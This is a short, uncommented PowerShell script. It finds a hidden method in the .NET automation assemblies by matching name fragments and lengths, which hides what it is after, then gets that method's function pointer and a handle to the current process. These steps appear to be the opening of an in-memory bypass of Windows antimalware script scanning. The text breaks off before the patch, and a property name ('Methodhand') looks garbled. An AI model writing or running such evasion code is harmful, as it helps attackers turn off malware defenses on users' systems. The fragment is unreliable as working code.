$funny = [appdomain]::currentdomain.getassemblies()
$funny |
  ForEach-Object {
    if($_.Location -ne $null){
   	 $splat1 = $_.FullName.Split(",")[0]
   	 If($splat1.StartsWith('S') -And $splat1.EndsWith('n') -And $splat1.Length -eq 28) {
   		 $Types = $_.GetTypes()
   	 }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
   		 $goofs = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
   	 }
    }
}

$goofs |
  ForEach-Object {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
  		 $MethodFound = $_
   	 }
    }
}

[IntPtr] $goofpoint = $MethodFound.Methodhand.GetFunctionPointer()
[IntPtr] $hand = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false
